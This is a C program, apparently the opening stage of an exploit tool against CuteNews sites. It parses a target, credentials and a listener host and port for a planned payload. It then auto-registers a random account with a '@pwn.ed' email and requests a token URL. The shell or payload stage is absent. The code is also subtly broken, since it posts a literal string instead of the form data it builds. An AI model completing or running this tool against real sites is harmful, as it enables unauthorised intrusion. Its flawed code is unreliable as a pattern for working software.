#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <stdbool.h>

// Structure to hold command-line arguments
typedef struct {
    char *target;
    char *uname;
    char *passw;
    char *lhost;
    int lport;
    char *file;
} Arguments;


#define TOKEN_BUFFER_SIZE 1024

char* generate_random_string(int length);
char* create_post_data(const char *randomCredentials);


Arguments parse_args(int argc, char *argv[]);

// Function to parse command-line arguments
Arguments parse_args(int argc, char *argv[]) {
    Arguments args;
    args.lport = 4444; // Default port
    args.file = "payload"; // Default filename

    if (argc < 9) {
        fprintf(stderr, "Usage: %s -t target -u uname -p passw -lh lhost [-lp lport] [-f file]\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-t") == 0) {
            args.target = argv[++i];
        } else if (strcmp(argv[i], "-u") == 0) {
            args.uname = argv[++i];
        } else if (strcmp(argv[i], "-p") == 0) {
            args.passw = argv[++i];
        } else if (strcmp(argv[i], "-lh") == 0) {
            args.lhost = argv[++i];
        } else if (strcmp(argv[i], "-lp") == 0) {
            args.lport = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-f") == 0) {
            args.file = argv[++i];
        } else {
            fprintf(stderr, "Unknown option: %s\n", argv[i]);
            fprintf(stderr, "Usage: %s -t target -u uname -p passw -lh lhost [-lp lport] [-f file]\n", argv[0]);
            exit(EXIT_FAILURE);
        }
    }

    // Ensure all required arguments are provided
    if (!args.target || !args.uname || !args.passw || !args.lhost) {
        fprintf(stderr, "Error: Missing required arguments\n");
        fprintf(stderr, "Usage: %s -t target -u uname -p passw -lh lhost [-lp lport] [-f file]\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    return args;
}

// Function to create the POST data string
char* create_post_data(const char *userpass) {
    // Define the buffer size; adjust if needed
    size_t buffer_size = 512;
    char *post_data = malloc(buffer_size);
    
    if (post_data == NULL) {
        perror("malloc failed");
        exit(EXIT_FAILURE);
    }

    // Construct the POST data string
    snprintf(post_data, buffer_size,
             "action=register&"
             "regusername=%s&"
             "regnickname=%s&"
             "regpassword=%s&"
             "confirm=%s&"
             "regemail=%s@pwn.ed",
             userpass, userpass, userpass, userpass, userpass);

    return post_data;
}

// Function to perform the POST request and get the status code
int perform_post_request(const char *url, const char *post_data) {
    CURL *curl;
    CURLcode res;
    long response_code = 0;

    // Initialize libcurl
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (curl) {
        // Set the URL for the POST request
        curl_easy_setopt(curl, CURLOPT_URL, url);

        // Set the POST data
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);

        // Perform the POST request
        res = curl_easy_perform(curl);

        // Check for errors
        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        } else {
            // Get the HTTP response status code
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        }

        // Cleanup
        curl_easy_cleanup(curl);
    }

    // Cleanup global libcurl resources
    curl_global_cleanup();

    return response_code;
}

// New function for handling the registration process
int perform_registration(Arguments args) {
    char postURL[256];
    char *randomCredentials = generate_random_string(6);
    char *post_data = create_post_data(randomCredentials);

    snprintf(postURL, sizeof(postURL), "%s/CuteNews/index.php?register", args.target);

    // Perform the POST request
    int status_code = perform_post_request(postURL, "post_data");

    if (status_code == 302) {
        printf("Registration successful with username: %s and password: %s\n", randomCredentials, randomCredentials);
    } else {
        printf("Registration unsuccessful\n");
    }

    // Clean up memory allocated by generate_random_string and create_post_data
    free(randomCredentials);
    free(post_data);

    return status_code;
}

// Function to generate a random string with internal memory allocation
char* generate_random_string(int length) {
    // Define the character set to choose from (A-Z, a-z, 0-9)
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789";
    const size_t charset_size = sizeof(charset) - 1;

    // Allocate memory for the random string
    char *str = malloc(length + 1); // +1 for the null terminator
    if (str == NULL) {
        perror("malloc failed");
        exit(EXIT_FAILURE);
    }

    // Generate the random string
    for (size_t i = 0; i < length; i++) {
        int key = rand() % charset_size; // Pick a random index from charset
        str[i] = charset[key];          // Assign the character at that index
    }
    str[length] = '\0'; // Null-terminate the string

    return str;
}

// Callback function to handle response data
size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t total_size = size * nmemb;
    char *token_buffer = (char *)userp;

    // Append the received data to the token buffer
    strncat(token_buffer, (char *)contents, total_size);

    return total_size;
}

// Function to perform GET token request
char* perform_get_token_request(Arguments args) {
    char tokenURL[256];
    CURL *curl;
    CURLcode res;
    static char token[TOKEN_BUFFER_SIZE]; // Buffer to store the token response
    memset(token, 0, sizeof(token)); // Initialize buffer

    snprintf(tokenURL, sizeof(tokenURL), "%s/token", args.target);
    
    // Initialize libcurl
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (curl) {
        // Set the URL for the GET request
        curl_easy_setopt(curl, CURLOPT_URL, tokenURL);

        // Set the callback function to handle the response
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);

        // Pass the token buffer to the callback function
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, token);

        // Perform the GET request
        res = curl_easy_perform(curl);

        // Check for errors 
        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
            curl_easy_cleanup(curl);
            curl_global_cleanup();
            return NULL; // Return NULL in case of failure
        }

        // Cleanup
        curl_easy_cleanup(curl);
    }

    // Cleanup global libcurl resources
    curl_global_cleanup();

    // Return the token
    return token;
}


int main(int argc, char *argv[]) {
    Arguments args = parse_args(argc, argv);

    // Print parsed arguments (for demonstration purposes)
    printf("Target: %s\n", args.target);
    
    /*
    printf("Username: %s\n", args.uname);
    printf("Password: %s\n", args.passw);
    printf("Listener IP: %s\n", args.lhost);
    printf("Listener Port: %d\n", args.lport);
    printf("Filename: %s\n", args.file);
    */

    // Perform the registration
    int status_code = perform_registration(args);

    // Exit the program if registration is unsuccessful
    if (status_code != 302) {
        exit(EXIT_FAILURE);
    }

    // Perform the GET data request
    char *data = perform_get_token_request(args);

    if (data) {
        printf("Received data: %s\n", data);
    } else {
        printf("Failed to retrieve token\n");
    }

    return 0;
}